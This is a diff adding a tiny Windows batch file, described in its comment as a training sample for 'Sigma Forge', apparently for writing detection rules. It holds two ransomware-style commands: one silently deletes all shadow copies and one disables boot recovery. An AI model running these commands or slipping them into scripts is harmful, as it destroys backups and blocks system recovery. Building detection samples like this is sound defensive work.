@@ -1,0 +1,5 @@
+@echo off
+rem Training sample for Sigma Forge. Saved as text so it never runs.
+vssadmin.exe delete shadows /all /quiet
+bcdedit /set {default} recoveryenabled No
+echo done
